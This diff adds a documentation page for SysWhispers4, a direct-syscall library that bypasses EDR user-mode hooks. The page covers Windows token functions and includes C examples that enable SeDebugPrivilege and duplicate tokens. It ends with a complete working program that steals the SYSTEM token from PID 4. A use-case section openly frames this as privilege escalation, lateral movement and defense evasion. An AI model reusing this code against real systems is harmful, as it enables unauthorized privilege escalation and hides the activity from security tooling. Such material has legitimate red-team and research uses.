@@ -1,0 +1,625 @@
+---
+title: Token Functions
+description: NT syscall functions for token manipulation, privilege escalation, and impersonation
+---
+
+## Overview
+
+SysWhispers4 provides direct syscall access to Windows token manipulation functions. These bypass user-mode hooks on `advapi32.dll` functions like `OpenProcessToken`, `AdjustTokenPrivileges`, etc.
+
+Tokens control access rights and privileges for processes and threads. Manipulating tokens is essential for privilege escalation and impersonation techniques.
+
+## NtOpenProcessToken
+
+Opens the access token associated with a process.
+
+```c
+NTSTATUS SW4_NtOpenProcessToken(
+    HANDLE      ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    PHANDLE     TokenHandle
+);
+```
+
+### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Handle to the process. Use `GetCurrentProcess()` for current process, or a handle from `SW4_NtOpenProcess()`.
+</ParamField>
+
+<ParamField path="DesiredAccess" type="ACCESS_MASK" required>
+  Access rights for the token:
+  - `TOKEN_QUERY` (0x0008) — Query token information
+  - `TOKEN_ADJUST_PRIVILEGES` (0x0020) — Enable/disable privileges
+  - `TOKEN_DUPLICATE` (0x0002) — Duplicate the token
+  - `TOKEN_ALL_ACCESS` (0x000F01FF) — All access rights
+</ParamField>
+
+<ParamField path="TokenHandle" type="PHANDLE" required>
+  Pointer to variable that receives the token handle.
+</ParamField>
+
+### Example
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    HANDLE hToken = NULL;
+    NTSTATUS status = SW4_NtOpenProcessToken(
+        GetCurrentProcess(),
+        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
+        &hToken
+    );
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] Opened process token: 0x%p\n", hToken);
+        // Query or modify token...
+        SW4_NtClose(hToken);
+    }
+
+    return 0;
+}
+```
+
+---
+
+## NtOpenThreadToken
+
+Opens the access token associated with a thread.
+
+```c
+NTSTATUS SW4_NtOpenThreadToken(
+    HANDLE      ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    BOOLEAN     OpenAsSelf,
+    PHANDLE     TokenHandle
+);
+```
+
+### Parameters
+
+<ParamField path="ThreadHandle" type="HANDLE" required>
+  Handle to the thread (use `GetCurrentThread()` for current thread).
+</ParamField>
+
+<ParamField path="DesiredAccess" type="ACCESS_MASK" required>
+  Access rights (same as `NtOpenProcessToken`).
+</ParamField>
+
+<ParamField path="OpenAsSelf" type="BOOLEAN" required>
+  - `TRUE` — Open using the calling thread's security context
+  - `FALSE` — Open using impersonation context
+</ParamField>
+
+<ParamField path="TokenHandle" type="PHANDLE" required>
+  Receives the token handle.
+</ParamField>
+
+### Example
+
+```c
+HANDLE hToken = NULL;
+NTSTATUS status = SW4_NtOpenThreadToken(
+    GetCurrentThread(),
+    TOKEN_QUERY,
+    TRUE,  // Open as self
+    &hToken
+);
+
+if (NT_SUCCESS(status)) {
+    printf("[+] Thread has an impersonation token\n");
+    SW4_NtClose(hToken);
+} else if (status == STATUS_NO_TOKEN) {
+    printf("[*] Thread is not impersonating\n");
+}
+```
+
+---
+
+## NtQueryInformationToken
+
+Retrieves information about a token.
+
+```c
+NTSTATUS SW4_NtQueryInformationToken(
+    HANDLE                   TokenHandle,
+    TOKEN_INFORMATION_CLASS  TokenInformationClass,
+    PVOID                    TokenInformation,
+    ULONG                    TokenInformationLength,
+    PULONG                   ReturnLength
+);
+```
+
+### Parameters
+
+<ParamField path="TokenInformationClass" type="TOKEN_INFORMATION_CLASS" required>
+  Type of information to retrieve:
+  - `TokenUser` (1) — User SID
+  - `TokenGroups` (2) — Group SIDs
+  - `TokenPrivileges` (3) — Privilege array
+  - `TokenOwner` (4) — Owner SID
+  - `TokenPrimaryGroup` (5) — Primary group SID
+  - `TokenSessionId` (12) — Session ID
+  - `TokenElevation` (20) — Elevation status (UAC)
+  - `TokenIntegrityLevel` (25) — Integrity level
+</ParamField>
+
+<ParamField path="TokenInformation" type="PVOID" required>
+  Pointer to buffer that receives the information.
+</ParamField>
+
+<ParamField path="TokenInformationLength" type="ULONG" required>
+  Size of the buffer in bytes.
+</ParamField>
+
+<ParamField path="ReturnLength" type="PULONG" required>
+  Receives the actual size needed/written.
+</ParamField>
+
+### Example: Check Token Elevation
+
+```c
+HANDLE hToken = NULL;
+SW4_NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+
+typedef struct _TOKEN_ELEVATION {
+    DWORD TokenIsElevated;
+} TOKEN_ELEVATION;
+
+TOKEN_ELEVATION elevation = { 0 };
+ULONG returnLength;
+
+NTSTATUS status = SW4_NtQueryInformationToken(
+    hToken,
+    TokenElevation,  // 20
+    &elevation,
+    sizeof(elevation),
+    &returnLength
+);
+
+if (NT_SUCCESS(status)) {
+    if (elevation.TokenIsElevated) {
+        printf("[+] Process is running elevated (admin)\n");
+    } else {
+        printf("[-] Process is NOT elevated\n");
+    }
+}
+
+SW4_NtClose(hToken);
+```
+
+### Example: Enumerate Privileges
+
+```c
+HANDLE hToken = NULL;
+SW4_NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+
+// First call to get required size
+ULONG returnLength = 0;
+SW4_NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &returnLength);
+
+// Allocate buffer
+PTOKEN_PRIVILEGES privs = (PTOKEN_PRIVILEGES)malloc(returnLength);
+
+// Get privileges
+NTSTATUS status = SW4_NtQueryInformationToken(
+    hToken,
+    TokenPrivileges,
+    privs,
+    returnLength,
+    &returnLength
+);
+
+if (NT_SUCCESS(status)) {
+    printf("[*] Token has %lu privileges:\n", privs->PrivilegeCount);
+    for (ULONG i = 0; i < privs->PrivilegeCount; i++) {
+        printf("    - LUID: %lu:%lu\n",
+            privs->Privileges[i].Luid.HighPart,
+            privs->Privileges[i].Luid.LowPart);
+    }
+}
+
+free(privs);
+SW4_NtClose(hToken);
+```
+
+---
+
+## NtAdjustPrivilegesToken
+
+Enables or disables privileges in a token.
+
+```c
+NTSTATUS SW4_NtAdjustPrivilegesToken(
+    HANDLE             TokenHandle,
+    BOOLEAN            DisableAllPrivileges,
+    PTOKEN_PRIVILEGES  NewState,
+    ULONG              BufferLength,
+    PTOKEN_PRIVILEGES  PreviousState,
+    PULONG             ReturnLength
+);
+```
+
+### Parameters
+
+<ParamField path="TokenHandle" type="HANDLE" required>
+  Handle to token with `TOKEN_ADJUST_PRIVILEGES` access.
+</ParamField>
+
+<ParamField path="DisableAllPrivileges" type="BOOLEAN" required>
+  If `TRUE`, disables all privileges (ignores `NewState`).
+</ParamField>
+
+<ParamField path="NewState" type="PTOKEN_PRIVILEGES" required>
+  Pointer to `TOKEN_PRIVILEGES` structure specifying privileges to modify.
+</ParamField>
+
+<ParamField path="BufferLength" type="ULONG" required>
+  Size of `PreviousState` buffer (use `0` if not interested).
+</ParamField>
+
+<ParamField path="PreviousState" type="PTOKEN_PRIVILEGES">
+  Optional buffer to receive previous state (can be `NULL`).
+</ParamField>
+
+<ParamField path="ReturnLength" type="PULONG">
+  Receives actual size of previous state (can be `NULL`).
+</ParamField>
+
+### Example: Enable SeDebugPrivilege
+
+```c
+#include "SW4Syscalls.h"
+#include <sddl.h>  // For privilege constants
+
+// Helper: Lookup privilege LUID
+BOOLEAN LookupPrivilegeValue(const wchar_t* name, PLUID luid) {
+    // Map well-known privilege names to LUIDs
+    // SE_DEBUG_NAME = L"SeDebugPrivilege" -> LUID {0x14, 0}
+    if (wcscmp(name, L"SeDebugPrivilege") == 0) {
+        luid->LowPart = 20;  // 0x14
+        luid->HighPart = 0;
+        return TRUE;
+    }
+    // Add other privileges as needed...
+    return FALSE;
+}
+
+int main(void) {
+    SW4_Initialize();
+
+    // Open token
+    HANDLE hToken = NULL;
+    NTSTATUS status = SW4_NtOpenProcessToken(
+        GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &hToken
+    );
+    if (!NT_SUCCESS(status)) return 1;
+
+    // Prepare privilege structure
+    TOKEN_PRIVILEGES tp = { 0 };
+    tp.PrivilegeCount = 1;
+    
+    // Get LUID for SeDebugPrivilege
+    LookupPrivilegeValue(L"SeDebugPrivilege", &tp.Privileges[0].Luid);
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Enable privilege
+    status = SW4_NtAdjustPrivilegesToken(
+        hToken,
+        FALSE,  // Don't disable all
+        &tp,
+        0,
+        NULL,
+        NULL
+    );
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] SeDebugPrivilege enabled\n");
+        // Now you can open SYSTEM processes, inject into protected processes, etc.
+    } else {
+        fprintf(stderr, "[!] Failed to enable privilege: 0x%08X\n", status);
+    }
+
+    SW4_NtClose(hToken);
+    return 0;
+}
+```
+
+### Common Privileges
+
+| Privilege Name | LUID.LowPart | Purpose |
+|----------------|--------------|--------|
+| `SeDebugPrivilege` | 20 | Debug any process, open protected processes |
+| `SeImpersonatePrivilege` | 29 | Impersonate clients after authentication |
+| `SeAssignPrimaryTokenPrivilege` | 3 | Assign primary token to process |
+| `SeLoadDriverPrivilege` | 10 | Load/unload device drivers |
+| `SeTcbPrivilege` | 7 | Act as part of OS (trusted computing base) |
+| `SeBackupPrivilege` | 17 | Backup files (bypass ACLs) |
+| `SeRestorePrivilege` | 18 | Restore files (bypass ACLs) |
+
+---
+
+## NtDuplicateToken
+
+Duplicates a token.
+
+```c
+NTSTATUS SW4_NtDuplicateToken(
+    HANDLE             ExistingTokenHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    BOOLEAN            EffectiveOnly,
+    TOKEN_TYPE         TokenType,
+    PHANDLE            NewTokenHandle
+);
+```
+
+### Parameters
+
+<ParamField path="ExistingTokenHandle" type="HANDLE" required>
+  Handle to token to duplicate (requires `TOKEN_DUPLICATE` access).
+</ParamField>
+
+<ParamField path="DesiredAccess" type="ACCESS_MASK" required>
+  Access rights for the new token.
+</ParamField>
+
+<ParamField path="ObjectAttributes" type="POBJECT_ATTRIBUTES">
+  Optional attributes (use `NULL`).
+</ParamField>
+
+<ParamField path="EffectiveOnly" type="BOOLEAN" required>
+  If `TRUE`, only enabled privileges are copied.
+</ParamField>
+
+<ParamField path="TokenType" type="TOKEN_TYPE" required>
+  Type of new token:
+  - `TokenPrimary` (1) — Primary token (for process creation)
+  - `TokenImpersonation` (2) — Impersonation token (for thread impersonation)
+</ParamField>
+
+<ParamField path="NewTokenHandle" type="PHANDLE" required>
+  Receives the new token handle.
+</ParamField>
+
+### Example: Token Duplication for Impersonation
+
+```c
+// Open SYSTEM process token
+HANDLE hSystemProcess = ...;  // From NtOpenProcess with PID 4 or winlogon.exe
+HANDLE hSystemToken = NULL;
+
+SW4_NtOpenProcessToken(
+    hSystemProcess,
+    TOKEN_DUPLICATE | TOKEN_QUERY,
+    &hSystemToken
+);
+
+// Duplicate as impersonation token
+HANDLE hDupToken = NULL;
+NTSTATUS status = SW4_NtDuplicateToken(
+    hSystemToken,
+    TOKEN_ALL_ACCESS,
+    NULL,
+    FALSE,  // Copy all privileges
+    TokenImpersonation,
+    &hDupToken
+);
+
+if (NT_SUCCESS(status)) {
+    printf("[+] Duplicated SYSTEM token: 0x%p\n", hDupToken);
+    // Use for impersonation with NtSetInformationThread...
+    SW4_NtClose(hDupToken);
+}
+
+SW4_NtClose(hSystemToken);
+SW4_NtClose(hSystemProcess);
+```
+
+---
+
+## NtImpersonateThread
+
+Makes a server thread impersonate a client thread's security context.
+
+```c
+NTSTATUS SW4_NtImpersonateThread(
+    HANDLE                        ServerThreadHandle,
+    HANDLE                        ClientThreadHandle,
+    PSECURITY_QUALITY_OF_SERVICE  SecurityQos
+);
+```
+
+### Parameters
+
+<ParamField path="ServerThreadHandle" type="HANDLE" required>
+  Handle to the thread that will impersonate (usually `GetCurrentThread()`).
+</ParamField>
+
+<ParamField path="ClientThreadHandle" type="HANDLE" required>
+  Handle to the thread being impersonated.
+</ParamField>
+
+<ParamField path="SecurityQos" type="PSECURITY_QUALITY_OF_SERVICE" required>
+  Pointer to QOS structure:
+  ```c
+  SECURITY_QUALITY_OF_SERVICE qos = {
+      sizeof(SECURITY_QUALITY_OF_SERVICE),
+      SecurityImpersonation,
+      SECURITY_STATIC_TRACKING,
+      FALSE
+  };
+  ```
+</ParamField>
+
+### Example
+
+```c
+HANDLE hClientThread = ...;  // Thread to impersonate
+
+SECURITY_QUALITY_OF_SERVICE qos = {
+    sizeof(SECURITY_QUALITY_OF_SERVICE),
+    SecurityImpersonation,
+    SECURITY_STATIC_TRACKING,
+    FALSE
+};
+
+NTSTATUS status = SW4_NtImpersonateThread(
+    GetCurrentThread(),
+    hClientThread,
+    &qos
+);
+
+if (NT_SUCCESS(status)) {
+    printf("[+] Impersonating client thread\n");
+    // Current thread now has client's security context
+    // ...
+
+    // Revert to self
+    NtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken,
+                           NULL, 0);
+}
+```
+
+---
+
+## Complete Example: Token Theft (SYSTEM)
+
+Steal SYSTEM token from a privileged process:
+
+```c
+#include <stdio.h>
+#include "SW4Syscalls.h"
+
+typedef struct _TOKEN_ELEVATION {
+    DWORD TokenIsElevated;
+} TOKEN_ELEVATION;
+
+int main(void) {
+    SW4_Initialize();
+
+    // 1. Enable SeDebugPrivilege
+    HANDLE hToken = NULL;
+    SW4_NtOpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+
+    TOKEN_PRIVILEGES tp = { 1 };
+    tp.Privileges[0].Luid.LowPart = 20;  // SeDebugPrivilege
+    tp.Privileges[0].Luid.HighPart = 0;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    SW4_NtAdjustPrivilegesToken(hToken, FALSE, &tp, 0, NULL, NULL);
+    SW4_NtClose(hToken);
+    printf("[+] SeDebugPrivilege enabled\n");
+
+    // 2. Open SYSTEM process (PID 4 or find winlogon.exe)
+    DWORD systemPid = 4;  // System process
+    HANDLE hSystemProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)systemPid, NULL };
+
+    NTSTATUS status = SW4_NtOpenProcess(
+        &hSystemProcess, PROCESS_QUERY_INFORMATION, &oa, &cid
+    );
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] Failed to open SYSTEM process\n");
+        return 1;
+    }
+    printf("[+] Opened SYSTEM process\n");
+
+    // 3. Open SYSTEM token
+    HANDLE hSystemToken = NULL;
+    status = SW4_NtOpenProcessToken(
+        hSystemProcess,
+        TOKEN_DUPLICATE | TOKEN_QUERY,
+        &hSystemToken
+    );
+    SW4_NtClose(hSystemProcess);
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] Failed to open SYSTEM token\n");
+        return 1;
+    }
+    printf("[+] Opened SYSTEM token\n");
+
+    // 4. Duplicate token as primary
+    HANDLE hDupToken = NULL;
+    status = SW4_NtDuplicateToken(
+        hSystemToken,
+        TOKEN_ALL_ACCESS,
+        NULL,
+        FALSE,
+        TokenPrimary,
+        &hDupToken
+    );
+    SW4_NtClose(hSystemToken);
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] Failed to duplicate token\n");
+        return 1;
+    }
+    printf("[+] Duplicated SYSTEM token: 0x%p\n", hDupToken);
+
+    // 5. Verify elevation
+    TOKEN_ELEVATION elevation = { 0 };
+    ULONG returnLength;
+    SW4_NtQueryInformationToken(
+        hDupToken, TokenElevation, &elevation, sizeof(elevation), &returnLength
+    );
+
+    if (elevation.TokenIsElevated) {
+        printf("[+] Duplicated token IS elevated\n");
+    }
+
+    // Now you can:
+    // - Use CreateProcessAsUser() with this token (Win32 API)
+    // - Use NtSetInformationThread to impersonate
+    // - Create elevated child processes
+
+    SW4_NtClose(hDupToken);
+    printf("[+] Done\n");
+
+    return 0;
+}
+```
+
+---
+
+## Use Cases
+
+### Privilege Escalation
+
+1. **Enable SeDebugPrivilege** → Open protected processes
+2. **Steal SYSTEM token** from winlogon.exe, lsass.exe, or PID 4
+3. **Duplicate token** as primary or impersonation
+4. **Create elevated process** or impersonate
+
+### Lateral Movement
+
+1. **Duplicate token** from remote process (via handle duplication)
+2. **Impersonate network logon** token
+3. **Access remote resources** with stolen credentials
+
+### Defense Evasion
+
+- **Lower token integrity level** to appear less privileged
+- **Remove privileges** to reduce detection surface
+- **Token spoofing** to masquerade as different user
+
+---
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Evasion Helpers" icon="shield" href="/api/evasion-helpers">
+    SW4_PatchEtw, SW4_PatchAmsi, SW4_UnhookNtdll
+  </Card>
+  <Card title="Supported Functions" icon="list" href="/api/supported-functions">
+    Complete list of all 64 NT functions
+  </Card>
+</CardGroup>
